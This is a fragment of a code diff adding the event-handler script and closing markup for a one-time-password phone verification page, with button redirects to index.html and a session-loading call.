+        verifyBtn.addEventListener('click', verifyOTP);
+
+        otpInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyOTP();
+            }
+        });
+
+        backBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = `index.html`;
+        });
+
+        closeBtn.addEventListener('click', function() {
+            window.location.href = `index.html`;
+        });
+
+        loadSession();
+
+        console.log('📱 OTP Phone page loaded. Session ID:', sessionId);
+    </script>
+</body>
+</html>
